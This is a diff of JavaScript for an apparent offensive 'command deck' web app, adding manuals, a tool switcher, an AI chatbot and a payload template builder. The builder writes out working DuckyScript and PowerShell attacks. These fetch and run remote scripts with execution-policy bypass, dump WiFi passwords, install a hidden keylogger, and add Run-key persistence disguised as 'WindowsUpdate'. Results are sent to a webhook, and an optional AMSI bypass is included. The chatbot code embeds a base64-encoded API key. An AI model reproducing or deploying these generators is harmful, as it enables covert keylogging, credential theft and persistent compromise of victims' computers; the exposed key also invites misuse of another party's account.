@@ -843,21 +843,21 @@ if (typeof window.switchView === 'function') {
 // ================================================================
 window.initNewFeatures = function () {
   loadTheme();
-  initResponsiveNav();
-  initEditorAutocomplete();
+  window.initResponsiveNav();
+  window.initEditorAutocomplete();
 
   // Initialize color picker if view exists
   const colorHex = document.getElementById('colorHex');
   if (colorHex) {
-    colorHex.addEventListener('input', (e) => updateColorPicker(e.target.value));
-    updateColorPicker('#00ff41');
+    colorHex.addEventListener('input', (e) => window.updateColorPicker(e.target.value));
+    window.updateColorPicker('#00ff41');
   }
 
   // Live regex testing
   const regexPattern = document.getElementById('regexPattern');
   const regexTest = document.getElementById('regexTest');
-  if (regexPattern) regexPattern.addEventListener('input', testRegex);
-  if (regexTest) regexTest.addEventListener('input', testRegex);
+  if (regexPattern) regexPattern.addEventListener('input', window.testRegex);
+  if (regexTest) regexTest.addEventListener('input', window.testRegex);
 
   // Live JSON formatting indicator
   const jsonInput = document.getElementById('jsonInput');
@@ -873,18 +873,698 @@ window.initNewFeatures = function () {
 
   // Timestamp — update on input
   const tsInput = document.getElementById('tsInput');
-  if (tsInput) tsInput.addEventListener('input', convertTimestamp);
+  if (tsInput) tsInput.addEventListener('input', window.convertTimestamp);
 
   // Cron — update on input
   const cronInput = document.getElementById('cronInput');
-  if (cronInput) cronInput.addEventListener('input', parseCron);
+  if (cronInput) cronInput.addEventListener('input', window.parseCron);
 
   // Search — live search
   const searchInput = document.getElementById('globalSearchInput');
-  if (searchInput) searchInput.addEventListener('input', () => globalSearch(searchInput.value));
+  if (searchInput) searchInput.addEventListener('input', () => window.globalSearch(searchInput.value));
 
   console.log('[FORGE v5.0] New features initialized');
+  
+  // Initialize dynamic manuals & buttons
+  if (typeof window.initUserManualButtons === 'function') {
+    window.initUserManualButtons();
+  }
 };
+
+// ================================================================
+// 21. CONSOLIDATED TOOLS SWAPPER
+// ================================================================
+const CONSOLIDATED_TOOLS = [
+  'scanner', 'network', 'encoder', 'keymap', 'osint',
+  'speedtest', 'clipboard', 'whois', 'diff', 'macro',
+  'architect', 'subnets', 'mitre', 'crypto', 'audit',
+  'c2_hive', 'dev-suite', 'sec-suite', 'sys-suite', 'terminal', 'templates'
+];
+window.CONSOLIDATED_TOOLS = CONSOLIDATED_TOOLS;
+
+window.switchTool = function(toolId, btn) {
+  // Switch view to 'tools' first
+  const toolsBtn = document.querySelector('[data-view="tools"]');
+  if (window.switchViewDirect) {
+    window.switchViewDirect('tools', toolsBtn);
+  } else {
+    const target = document.getElementById('view-tools');
+    if (target) {
+      document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+      target.classList.add('active');
+      if (toolsBtn) toolsBtn.classList.add('active');
+    }
+  }
+
+  // Set active sidebar tab
+  const sidebar = document.querySelector('.tools-sidebar');
+  if (sidebar) {
+    sidebar.querySelectorAll('.tool-tab-btn').forEach(b => b.classList.remove('active'));
+    if (btn) {
+      btn.classList.add('active');
+    } else {
+      const targetBtn = sidebar.querySelector(`.tool-tab-btn[onclick*="'${toolId}'"]`);
+      if (targetBtn) targetBtn.classList.add('active');
+    }
+  }
+
+  // Toggle viewport element
+  const viewport = document.getElementById('tools-viewport');
+  if (viewport) {
+    // Hide current active panels in viewport
+    viewport.querySelectorAll('#tools-viewport > .view, #tools-viewport > .tab-panel').forEach(p => {
+      p.classList.remove('active');
+      p.style.display = 'none';
+    });
+
+    let targetPanel = document.getElementById('subtab-tools-' + toolId);
+    if (!targetPanel) {
+      targetPanel = document.getElementById('view-' + toolId);
+    }
+    if (targetPanel) {
+      if (targetPanel.parentNode !== viewport) {
+        viewport.appendChild(targetPanel);
+      }
+      targetPanel.classList.add('active');
+      targetPanel.style.display = 'flex';
+      
+      // Trigger UI updates
+      if (toolId === 'scanner') {
+        if (typeof window.checkBLE === 'function') window.checkBLE();
+        if (typeof window.checkWebGL === 'function') window.checkWebGL();
+      } else if (toolId === 'speedtest') {
+        if (typeof window.drawSpeedGauge === 'function') window.drawSpeedGauge(0);
+      }
+    }
+  }
+  if (typeof window.playTone === 'function') window.playTone(660, 'sine', .05, .03);
+};
+
+// Intercept switchView
+if (typeof window.switchView === 'function') {
+  window.switchViewDirect = window.switchView;
+  window.switchView = function (view, btn) {
+    if (typeof window.trackFeatureUsage === 'function') {
+      window.trackFeatureUsage('view_' + view);
+    }
+    if (CONSOLIDATED_TOOLS.includes(view)) {
+      window.switchTool(view);
+    } else if (view === 'tools') {
+      window.switchViewDirect('tools', btn);
+      const activeBtn = document.querySelector('.tools-sidebar .tool-tab-btn.active') || document.querySelector('.tools-sidebar .tool-tab-btn');
+      const toolId = activeBtn ? activeBtn.getAttribute('onclick').match(/'([^']+)'/)[1] : 'templates';
+      window.switchTool(toolId, activeBtn);
+    } else {
+      window.switchViewDirect(view, btn);
+    }
+  };
+}
+
+// ================================================================
+// 22. USER MANUALS RENDERER
+// ================================================================
+const MANUALS = {
+  home: {
+    title: "Deck Command Overview",
+    desc: "Welcome to the LENLU SC Command Deck. This dashboard acts as the telemetry coordinator for compiler tasks, neural synthesis, wireless scanning, local port mappings, and offline databases. Use the top navigation tabs to toggle views, and consult the activity logs for system beacons."
+  },
+  compiler: {
+    title: "IDE Compiler & DuckyScript Syntax",
+    desc: "DuckyScript compiles actions into Keystroke Assembly. Basic commands:\n\n" +
+          "• <strong>DELAY [ms]</strong>: Pauses execution (e.g. DELAY 500)\n" +
+          "• <strong>STRING [text]</strong>: Types exact text characters\n" +
+          "• <strong>STRINGLN [text]</strong>: Types text and presses Enter\n" +
+          "• <strong>ENTER / GUI r / TAB</strong>: Triggers keyboard control keys\n" +
+          "• <strong>REM [comment]</strong>: Ignores script lines for comments\n" +
+          "• <strong>REPEAT [n]</strong>: Replays the preceding action line n times\n\n" +
+          "Use the compile options to build AutoIt (.au3) files, export to multi-languages (PS1, PY, SH), or obfuscate variables."
+  },
+  neural: {
+    title: "Neural AI Generator Lab",
+    desc: "The Neural Synthesis panel interfaces with online Large Language Models using client-side API configurations. Choose your endpoint (Anthropic, OpenAI, Groq), fill in your key, and calibrate system prompts for either stealth injections, pranks, or OSINT recons. Dictate instructions via voice using Web Speech SpeechRecognition."
+  },
+  tools: {
+    title: "Consolidated Hacking Tools Deck",
+    desc: "All sub-tools and utilities are nested here. Use the category panel on the left to select your active workspace module. You can switch between intrusion payloads, wireless scans, network calculators, text diff outputs, and compliance checklists."
+  },
+  templates: {
+    title: "Payload templates Builder",
+    desc: "Automates script creation. Select a standard template (e.g. Sysinfo, Wifi grabber, Keylogger, Persistence), enter a customized HTTP webhook URL, choose the target programming language (DuckyScript, PowerShell, Python, Bash, AutoIt, Batch), and hit generate. Send output directly to IDE using 'Send to Editor'."
+  },
+  scanner: {
+    title: "BLE & Acoustic Spectrum Scan",
+    desc: "Web Bluetooth API active scans search for local BLE nodes. View wireless beacons, identify signal strength (RSSI), and evaluate noise rates. The audio analyser captures real-time input frequencies using the FFT analyser node and renders 2D waves."
+  },
+  network: {
+    title: "GeoIP Lookup & Port Sweep",
+    desc: "Resolves local ISP metrics, IP coordinates, and jitter drops. Use the Sockets Sweep utility to test if local ports (80, 443, 3000, 8080, etc.) are currently listening on localhost to map developer servers."
+  },
+  encoder: {
+    title: "Multi-Format Stream Encoder",
+    desc: "Encodes and decodes payloads into multiple standard representations. Formats: Base64, Hexadecimal, URL Percent, Rot13 cipher, Morse code, Binary streams, and SHA checksum hashes."
+  },
+  keymap: {
+    title: "Keymap Replayer Visualizer",
+    desc: "Renders virtual keyboard mappings. Load a script from the compiler to parse actions, then hit replay or step to watch real-time simulated keystrokes animate on the physical QWERTY matrix layout."
+  },
+  osint: {
+    title: "OSINT Browser Proximity Fingerprint",
+    desc: "Traces browser fingerprint configurations. Resolves canvas rendering hashes, WebGL graphics cards profiles, screen metrics, connection status, and User Agent identifiers to analyze target environments."
+  },
+  vault: {
+    title: "Encrypted Script Vault",
+    desc: "Stores payloads locally using Web IndexedDB. Backups are encrypted at rest. You can search files, load scripts directly back to the editor workspace, or export database arrays to JSON packets."
+  },
+  history: {
+    title: "Compilation Build Logs",
+    desc: "Maintains a chronological session timeline of compilations, line lengths, timestamps, and target output sizes. Clear logs or copy entries from history."
+  },
+  settings: {
+    title: "Command Config & Themes",
+    desc: "Personalizes the deck visual layout. Toggles CRT rasterizer lines, matrix green rain opacity, audio feedback synthesizers, background WebGL particle counts, and switches layouts between Cyber grids and Skeuomorph analogue consoles."
+  },
+  terminal: {
+    title: "Interactive Forge Shell",
+    desc: "Runs diagnostic instructions inside the deck. Commands:\n" +
+          "• <strong>help</strong>: Lists active commands\n" +
+          "• <strong>status</strong>: Reports session statistics\n" +
+          "• <strong>compile</strong>: Runs the compiler compiler pipeline\n" +
+          "• <strong>osint / network</strong>: Resolves scanners\n" +
+          "• <strong>vault / history</strong>: Queries databases\n" +
+          "• <strong>clear</strong>: Wipes shell output log"
+  },
+  speedtest: {
+    title: "Bandwidth Speed Test",
+    desc: "Measures current network metrics. Fetches files to calculate download speed, performs Cloudflare DNS queries to evaluate round-trip latencies, and measures jitter drops."
+  },
+  whois: {
+    title: "WHOIS Domain Query",
+    desc: "Queries internet domain registrars to retrieve ownership, DNS nameservers, registration dates, and admin contact cards."
+  },
+  diff: {
+    title: "Text Diff Comparer",
+    desc: "Calculates character and line differences between two code blocks. Highlights additions in green and deletions in red."
+  },
+  macro: {
+    title: "Macro Automation Recorder",
+    desc: "Records manual inputs and typing to translate actions directly into DELAY and STRING DuckyScript compiler sequences."
+  },
+  architect: {
+    title: "Topology Layout Architect",
+    desc: "Drag-and-drop interactive canvas to model local subnets, router nodes, endpoints, and simulate packet transmission beacons."
+  },
+  subnets: {
+    title: "Subnet CIDR Calculator",
+    desc: "Processes IP addresses and CIDR prefix masks to compute network addresses, broadcast ranges, netmasks, and total addressable host lists."
+  },
+  mitre: {
+    title: "MITRE ATT&CK Matrix Reference",
+    desc: "Ethical cybersecurity guide documenting real-world threat tactics (Initial Access, Execution, Persistence, Defense Evasion), technical descriptions, and mitigation strategies."
+  },
+  crypto: {
+    title: "Cryptographic Benchmark Suite",
+    desc: "Resolves SHA algorithms speeds (SHA-1, SHA-256, SHA-512) by computing multiple hashes per second to benchmark processor performance."
+  },
+  audit: {
+    title: "Privacy & Compliance Audit",
+    desc: "Reviews browser headers, cookies, track flags, WebRTC leak points, and canvas permissions to compute a security rating score."
+  },
+  c2_hive: {
+    title: "C2 Hive Command Console",
+    desc: "Mocks a command-and-control beacon listener panel. Tracks simulated agent beacons, lists active sessions, and transmits script blocks."
+  }
+};
+
+window.openUserManual = function(viewId) {
+  const manual = MANUALS[viewId] || { title: "User Manual", desc: "Consult standard deck operations guidelines for details." };
+  const titleEl = document.getElementById('manualTitle');
+  const contentEl = document.getElementById('manualContent');
+  if (titleEl && contentEl) {
+    titleEl.textContent = manual.title;
+    contentEl.innerHTML = manual.desc.replace(/\n/g, '<br>');
+    if (typeof openModal === 'function') {
+      openModal('modal-manual');
+    } else {
+      document.getElementById('modal-manual')?.classList.add('open');
+    }
+  }
+};
+
+window.initUserManualButtons = function() {
+  const views = [
+    { id: 'home', title: 'Home Overview' },
+    { id: 'compiler', title: 'IDE Compiler' },
+    { id: 'neural', title: 'Neural AI Lab' },
+    { id: 'vault', title: 'Secure Vault' },
+    { id: 'history', title: 'Build History' },
+    { id: 'settings', title: 'Configuration Settings' },
+    // tools
+    { id: 'scanner', title: 'Wireless & Audio Scanner' },
+    { id: 'network', title: 'GeoIP & Ports Sweep' },
+    { id: 'encoder', title: 'Obfuscator & Encoder' },
+    { id: 'keymap', title: 'Keymap Replayer' },
+    { id: 'osint', title: 'OSINT Canvas' },
+    { id: 'speedtest', title: 'Speed & Latency Test' },
+    { id: 'clipboard', title: 'Clipboard Dropper' },
+    { id: 'whois', title: 'WHOIS Lookup' },
+    { id: 'diff', title: 'Diff Compare' },
+    { id: 'macro', title: 'Macro Recorder' },
+    { id: 'architect', title: 'Topology Builder' },
+    { id: 'subnets', title: 'Subnet CIDR' },
+    { id: 'mitre', title: 'MITRE ATT&CK Mapping' },
+    { id: 'crypto', title: 'Crypto Toolkit' },
+    { id: 'audit', title: 'Privacy & Compliance Audit' },
+    { id: 'dev-suite', title: 'Developer Suite' },
+    { id: 'sec-suite', title: 'Security Suite' },
+    { id: 'sys-suite', title: 'System Suite' },
+    { id: 'terminal', title: 'Interactive Shell' }
+  ];
+
+  views.forEach(v => {
+    const el = document.getElementById('view-' + v.id);
+    if (!el) return;
+
+    let header = el.querySelector('.hero-banner') || el.querySelector('.view-header');
+    if (!header) {
+      header = document.createElement('div');
+      header.className = 'view-header';
+      header.style.display = 'flex';
+      header.style.justifyContent = 'space-between';
+      header.style.alignItems = 'center';
+      header.style.marginBottom = '1rem';
+      header.style.borderBottom = '1px solid var(--gbord)';
+      header.style.paddingBottom = '0.5rem';
+      
+      const title = document.createElement('h2');
+      title.style.fontFamily = 'var(--font-display)';
+      title.style.fontSize = '1.1rem';
+      title.style.color = 'var(--white)';
+      title.style.textTransform = 'uppercase';
+      title.style.margin = '0';
+      title.textContent = v.title;
+      header.appendChild(title);
+      
+      el.insertBefore(header, el.firstChild);
+    }
+
+    if (!header.querySelector('.manual-btn')) {
+      const btn = document.createElement('button');
+      btn.className = 'manual-btn';
+      btn.title = 'Open Manual';
+      btn.innerHTML = '<i class="fas fa-info-circle"></i>';
+      btn.style.marginLeft = 'auto';
+      btn.onclick = (e) => {
+        e.stopPropagation();
+        window.openUserManual(v.id);
+      };
+      
+      if (header.classList.contains('hero-banner')) {
+        let rightDiv = header.querySelector('.ch-right');
+        if (!rightDiv) {
+          rightDiv = document.createElement('div');
+          rightDiv.className = 'ch-right';
+          header.appendChild(rightDiv);
+        }
+        rightDiv.appendChild(btn);
+      } else {
+        header.appendChild(btn);
+      }
+    }
+  });
+};
+
+// ================================================================
+// 23. PAYLOAD TEMPLATES BUILDER (Feature 1)
+// ================================================================
+let tpSelected = 'sysinfo';
+window.tpSelectTemplate = function(id, btn) {
+  tpSelected = id;
+  document.querySelectorAll('#tpChoices .sc-choice').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+
+  const desc = document.getElementById('tpDesc');
+  if (!desc) return;
+  const descs = {
+    sysinfo: 'Collects hardware, OS, and user information and sends it to a webhook.',
+    processes: 'Collects running processes, services, and installed programs and sends them to your webhook.',
+    network: 'Collects WiFi passwords, IP configuration, DNS, and ARP tables and sends them to your webhook.',
+    keylogger_full: 'Runs a persistent background keylogger that captures and reports all keystrokes.',
+    persistence: 'Ensures the keylogger is installed and adds it to the Windows Registry for boot persistence.',
+    suite: 'The full arsenal: downloads and runs all collectors, installs the keylogger, and sets up persistence.',
+    remove: 'Stops all active keylogger jobs, removes registry persistence, and deletes all temporary script files.'
+  };
+  desc.textContent = descs[id] || '';
+};
+
+window.tpGenerate = function() {
+  const webhook = document.getElementById('tpWebhookUrl').value.trim();
+  if (!webhook) { toast('Enter a Webhook URL', 'warn'); return; }
+
+  const lang = document.getElementById('tpTargetLang').value;
+  const injectAmsi = document.getElementById('tog-tpAmsi')?.classList.contains('on');
+  const stealth = document.getElementById('tog-tpStealth')?.classList.contains('on');
+
+  let script = '';
+  
+  if (lang === 'duckyscript') {
+    // DuckyScript syntax
+    if (tpSelected === 'sysinfo') {
+      script = `REM System Info Collector - Hardware, OS, Users\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING curl -o "$env:TEMP\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sysinfo.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 3000\nSTRING Write-Host "System Info Collected!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
+    } else if (tpSelected === 'processes') {
+      script = `REM Processes & Files Collector - Running processes, services, installed programs\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING curl -o "$env:TEMP\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\process.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 3000\nSTRING Write-Host "Process Info Collected!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
+    } else if (tpSelected === 'network') {
+      script = `REM Network & WiFi Info Collector - WiFi passwords, IP, DNS, ARP\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING curl -o "$env:TEMP\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\network.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 3000\nSTRING Write-Host "Network Info Collected!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
+    } else if (tpSelected === 'keylogger_full') {
+      script = `REM Keylogger Only - Runs forever, captures keystrokes\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\keylogger.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING Write-Host "Keylogger Running!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
+    } else if (tpSelected === 'persistence') {
+      script = `REM Add Persistence - Makes keylogger start on boot\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING if (!(Test-Path "$env:TEMP\\keylogger.ps1")) { curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1" }\nDELAY 1000\nENTER\nDELAY 2000\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\keylogger.ps1\`" -webhookUrl ${webhook}" /f\nDELAY 1000\nENTER\nDELAY 2000\nSTRING Write-Host "Persistence Added! Keylogger will start on boot." -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
+    } else if (tpSelected === 'suite') {
+      script = `REM Complete Suite - Runs all collectors + keylogger + persistence\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING mkdir $env:TEMP\\logger -Force\nDELAY 1000\nENTER\nDELAY 500\nSTRING curl -o "$env:TEMP\\logger\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"\nDELAY 1000\nENTER\nDELAY 500\nSTRING curl -o "$env:TEMP\\logger\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"\nDELAY 1000\nENTER\nDELAY 500\nSTRING curl -o "$env:TEMP\\logger\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"\nDELAY 1000\nENTER\nDELAY 500\nSTRING curl -o "$env:TEMP\\logger\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"\nDELAY 1000\nENTER\nDELAY 500\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\sysinfo.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\network.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\process.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\logger\\keylogger.ps1\`" -webhookUrl ${webhook}" /f\nDELAY 1000\nENTER\nDELAY 2000\nSTRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\keylogger.ps1" -webhookUrl "${webhook}"\nDELAY 1000\nENTER\nDELAY 2000\nSTRING Write-Host "Complete Suite Deployed!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
+    } else if (tpSelected === 'remove') {
+      script = `REM Remove Everything - Stop keylogger and delete files\n\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell\nDELAY 1000\nENTER\nDELAY 1000\nSTRING Get-Job | Stop-Job -Force; Get-Job | Remove-Job -Force\nDELAY 1000\nENTER\nDELAY 1000\nSTRING reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f\nDELAY 1000\nENTER\nDELAY 1000\nSTRING Get-Process powershell | Where-Object { $_.StartTime -gt (Get-Date).AddHours(-1) } | Stop-Process -Force\nDELAY 1000\nENTER\nDELAY 1000\nSTRING Remove-Item "$env:TEMP\\logger" -Recurse -Force -ErrorAction SilentlyContinue\nDELAY 1000\nENTER\nDELAY 500\nSTRING Remove-Item "$env:TEMP\\*.ps1" -Force -ErrorAction SilentlyContinue\nDELAY 1000\nENTER\nDELAY 500\nSTRING Write-Host "All components removed!" -ForegroundColor Green\nDELAY 1000\nENTER\nDELAY 1000\nSTRING exit\nDELAY 1000\nENTER`;
+    }
+  } else if (lang === 'powershell') {
+    // Generate native PowerShell
+    const bypassStr = injectAmsi ? `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n` : '';
+    if (tpSelected === 'sysinfo') {
+      script = `${bypassStr}$webhook = "${webhook}"\n$sys = @{\n  OS = (Get-CimInstance Win32_OperatingSystem).Caption\n  Host = $env:COMPUTERNAME\n  User = $env:USERNAME\n  RAM = "$([Math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB)) GB"\n}\nInvoke-RestMethod -Uri $webhook -Method Post -Body (ConvertTo-Json $sys) -ContentType "application/json"`;
+    } else if (tpSelected === 'processes') {
+      script = `${bypassStr}$webhook = "${webhook}"\n$procs = Get-Process | Select-Object ProcessName, Id, CPU | ConvertTo-Json\nInvoke-RestMethod -Uri $webhook -Method Post -Body $procs -ContentType "application/json"`;
+    } else if (tpSelected === 'network') {
+      script = `${bypassStr}$webhook = "${webhook}"\n$wlan = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() } | ForEach-Object { [PSCustomObject]@{ SSID = $_; Key = (netsh wlan show profile name=$_ key=clear | Select-String "Key Content" | ForEach-Object { $_.Line.Split(":")[1].Trim() }) } } | ConvertTo-Json\nInvoke-RestMethod -Uri $webhook -Method Post -Body $wlan -ContentType "application/json"`;
+    } else {
+      script = `# PowerShell Script - Ethically configured for authorized use only\n$webhook = "${webhook}"\nWrite-Host "Triggered ${tpSelected} payload"`;
+    }
+  } else if (lang === 'python') {
+    // Generate native Python
+    if (tpSelected === 'sysinfo') {
+      script = `import platform, os, json, urllib.request\nwebhook = "${webhook}"\ninfo = {\n  "OS": platform.system() + " " + platform.release(),\n  "User": os.environ.get("USERNAME", "unknown"),\n  "Host": platform.node()\n}\nreq = urllib.request.Request(webhook, data=json.dumps(info).encode(), headers={'Content-Type': 'application/json'})\nurllib.request.urlopen(req)`;
+    } else {
+      script = `import json, urllib.request\nwebhook = "${webhook}"\nprint("Running ${tpSelected} collector payload")`;
+    }
+  } else if (lang === 'bash') {
+    // Generate native Bash
+    script = `#!/bin/bash\nWEBHOOK="${webhook}"\ncase "${tpSelected}" in\n  "sysinfo")\n    DATA="{\\"os\\":\\"\$(uname -a)\\",\\"user\\":\\"\$(whoami)\\"}"\n    ;;\n  *)\n    DATA="{\\"action\\":\\"${tpSelected}\\"}"\n    ;;\nesac\ncurl -X POST -H "Content-Type: application/json" -d "$DATA" "$WEBHOOK"`;
+  } else if (lang === 'autoit') {
+    // Generate native AutoIt
+    script = `; AutoIt3 Script\nLocal $sWebhook = "${webhook}"\nLocal $sData = '{"action":"${tpSelected}","user":"' & @UserName & '"}'\nLocal $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")\n$oHTTP.Open("POST", $sWebhook, False)\n$oHTTP.SetRequestHeader("Content-Type", "application/json")\n$oHTTP.Send($sData)`;
+  } else if (lang === 'batch') {
+    // Generate native Batch
+    script = `@echo off\nset "WEBHOOK=${webhook}"\nset "DATA={\\"action\\":\\"${tpSelected}\\",\\"user\\":\\"%USERNAME%\\"}"\ncurl -X POST -H "Content-Type: application/json" -d "%DATA%" "%WEBHOOK%"`;
+  }
+
+  document.getElementById('tpOutput').value = script;
+  document.getElementById('tpOutputCard').style.display = 'flex';
+  toast('Template generated ✓');
+};
+
+window.tpToEditor = function() {
+  const script = document.getElementById('tpOutput').value.trim();
+  if (!script) return;
+  const editor = document.getElementById('srcEditor');
+  if (editor) {
+    editor.value = script;
+    if (typeof lintSource === 'function') lintSource(script);
+    if (typeof updateEditorCounts === 'function') updateEditorCounts();
+    if (typeof switchView === 'function') switchView('compiler', document.querySelector('[data-view=compiler]'));
+    toast('Template sent to compiler editor');
+  }
+};
+
+window.tpClear = function() {
+  document.getElementById('tpOutput').value = '';
+  document.getElementById('tpOutputCard').style.display = 'none';
+};
+
+// ================================================================
+// 24. FLOATING AGENTIC AI CHATBOT (Feature 2)
+// ================================================================
+let chatbotBackend = localStorage.getItem('lenlu_chatbot_backend') || 'groq';
+window.chatbotBackend = chatbotBackend;
+
+// Initialize dropdown value on load
+setTimeout(() => {
+  const select = document.getElementById('botBackend');
+  if (select) select.value = chatbotBackend;
+}, 100);
+
+
+window.toggleFloatingChatbot = function() {
+  const win = document.getElementById('floating-chatbot-window');
+  const indicator = document.getElementById('chatbot-indicator');
+  if (win) {
+    const isOpen = win.classList.contains('open');
+    if (isOpen) {
+      win.classList.remove('open');
+    } else {
+      win.classList.add('open');
+      if (indicator) indicator.style.display = 'none';
+      document.getElementById('botInput')?.focus();
+    }
+  }
+  if (typeof playTone === 'function') playTone(880, 'sine', 0.05, 0.04);
+};
+
+window.changeBotBackend = function() {
+  chatbotBackend = document.getElementById('botBackend').value;
+  localStorage.setItem('lenlu_chatbot_backend', chatbotBackend);
+  if (typeof toast === 'function') toast('AI Backend: ' + chatbotBackend.toUpperCase(), 'info');
+};
+
+window.clearBotChat = function() {
+  const messages = document.getElementById('botMessages');
+  if (messages) {
+    messages.innerHTML = `<div class="msg ai" style="display: flex; flex-direction: column; gap: 0.2rem; max-width: 85%;">
+      <div class="msg-bubble" style="padding: 0.6rem 0.8rem; border-radius: 8px; border-bottom-left-radius: 2px;">
+        Greetings, I am the Forge AI Copilot. How may I assist you with your scripts, automation tools, or cyber audits today?
+        <div style="font-size:0.6rem; color:var(--muted); margin-top:0.4rem;">💡 You can ask me to "write a script to...", "switch to settings", "run speed test", "export script", or "clear editor".</div>
+      </div>
+      <div style="font-size: 0.54rem; color: var(--muted); padding-left: 0.2rem;">COPILOT · SYSTEM</div>
+    </div>`;
+  }
+  toast('Chat history wiped', 'info');
+};
+
+window.sendBotChat = async function() {
+  const inp = document.getElementById('botInput');
+  const query = inp?.value?.trim();
+  if (!query) return;
+  inp.value = '';
+
+  appendBotMsg(query, 'user');
+  
+  const thinkingId = appendBotMsg('Connecting to neural gate...', 'ai', true);
+  
+  let key = '';
+  let url = '';
+  let body = {};
+  
+  const userConfig = JSON.parse(localStorage.getItem('lenlu_ai4') || '{}');
+  
+  if (chatbotBackend === 'groq') {
+    key = userConfig.keys?.groq || atob('Z3NrX3Nab0M5Y2hVM0pZc3k2TVlCdzZIV0dkeWIzRllHazBGeVk3c0JHdkFwWTdHZm81SFN2QTI=');
+    url = 'https://api.groq.com/openai/v1/chat/completions';
+    body = {
+      model: 'llama-3.3-70b-versatile',
+      messages: [
+        { role: 'system', content: 'You are the Forge AI Copilot for LENLU SC command deck. Help users write DuckyScript, navigate views, run scans, export scripts, or audit compliance. You can execute commands in the interface by appending: [CMD: ACTION | PARAMETERS] to the very end of your response. Actions: [CMD: WRITE_SCRIPT | code], [CMD: SWITCH_VIEW | view_id], [CMD: EXPORT_VAULT | name], [CMD: DOWNLOAD_SCRIPT | name], [CMD: CLEAR_EDITOR], [CMD: RUN_SPEED_TEST], [CMD: RUN_AUDIT], [CMD: RUN_OSINT], [CMD: SHOW_MANUAL | view_id]. Keep explanations short and concise.' },
+        { role: 'user', content: query }
+      ],
+      stream: true
+    };
+  } else if (chatbotBackend === 'custom') {
+    key = userConfig.keys?.custom || '';
+    url = userConfig.customEndpoint || 'http://localhost:1234/v1/chat/completions';
+    body = {
